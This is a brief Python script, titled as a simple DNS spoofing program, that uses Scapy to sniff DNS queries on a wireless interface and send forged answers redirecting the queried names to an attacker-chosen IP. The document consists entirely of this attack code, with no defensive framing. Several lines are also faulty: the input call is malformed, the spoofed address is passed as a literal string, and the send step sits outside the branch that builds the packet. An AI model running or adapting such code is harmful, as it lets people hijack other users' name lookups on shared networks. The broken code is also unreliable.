## Simple DNS spoofing program



from scapy.all import *

ip_to_spoof = raw_input(*'What IP do you want the Dns to resolve to')

def dnsspoof(pkt):

        if pkt.haslayer(DNSQR):
                     
                      spoofed = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
                      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata='ip_to_spoof'))
        send(spoofed)
        print('sent',spoofed.summary())


sniff(filter="udp port 53", iface="wlan0", prn=dnsspoof)

